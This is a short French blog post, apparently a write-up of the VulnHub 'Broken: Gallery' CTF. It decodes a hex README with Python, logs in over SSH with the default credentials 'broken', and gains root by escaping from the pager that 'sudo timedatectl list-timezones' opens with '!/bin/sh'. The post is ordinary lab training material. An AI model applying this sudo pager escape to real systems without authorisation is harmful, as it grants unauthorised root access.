---
title: "Solution du CTF Broken: Gallery de VulnHub"
tags: [CTF, VulnHub]
---

[Broken: Gallery](https://vulnhub.com/entry/broken-gallery,344/) était un CTF absolument nul comme on peut en trouver sur _VulnHub_ (mais on en trouve des très bons aussi).

On trouve sur la VM un serveur SSH ainsi qu'un HTTP avec directory listing activé.

Un fichier `README` contient des données en hexadécimal de la forme `0xXX, 0xXX`. J'ai écrit le code suivant pour décoder :

```python
from binascii import unhexlify
import requests

response = requests.get("http://192.168.56.196/README.md")
hexa_code = response.text.replace(", ", "").replace("\n", "").replace("0x", "")
data = unhexlify(hexa_code)
with open("out", "wb") as fd:
    fd.write(data)
```

On obtenait alors une image GIF qui contenait le texte suivant :

> Hello Bob,
> The application is BROKEN ! the whole infrastructure is BROKEN !!!
> I am leaving for my summer vacation, I hope you  get it fix soon ...
> Cheers.
> avrahamcohen.ac@gmail.com

Faute de plus d'informations, un être humain normalement constitué tenterait de brute forcer un mot de passe pour `bob` ou `avraham`.

Sauf qu'ici il faut se connecter sur le SSH avec le nom d'utilisateur de mot de passe `broken`.

On a alors ces permissions :

```console
broken@ubuntu:~$ sudo -l
Matching Defaults entries for broken on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User broken may run the following commands on ubuntu:
    (ALL) NOPASSWD: /usr/bin/timedatectl
    (ALL) NOPASSWD: /sbin/reboot
```

`timedatectl` est un binaire legit et quand on demande son aide on obtient ceci :

```console
broken@ubuntu:~$ timedatectl -h
timedatectl [OPTIONS...] COMMAND ...

Query or change system time and date settings.

  -h --help                Show this help message
     --version             Show package version
     --no-pager            Do not pipe output into a pager
     --no-ask-password     Do not prompt for password
  -H --host=[USER@]HOST    Operate on remote host
  -M --machine=CONTAINER   Operate on local container
     --adjust-system-clock Adjust system clock when changing local RTC mode

Commands:
  status                   Show current time settings
  set-time TIME            Set system time
  set-timezone ZONE        Set system time zone
  list-timezones           Show known time zones
  set-local-rtc BOOL       Control whether RTC is in local time
  set-ntp BOOL             Enable or disable network time synchronization
```

L'option `--no-pager` est intéressante, car elle laisse supposer qu'un pager comme `less` est exécuté or, il est facile de faire exécuter une commande à un pager.

L'option, `list-timezones` semble typiquement être une option qui lancerait un pager. Et c'est d'ailleurs la bonne :

```console
broken@ubuntu:~$ sudo  /usr/bin/timedatectl list-timezones
Africa/Abidjan
Africa/Accra
Africa/Addis_Ababa
Africa/Algiers
Africa/Asmara
--- snip ---
!/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

Voilà, c'était nul. Au mieux je vous ai fait gagner du temps à ne pas faire ce CTF. La vie est courte. Peace.
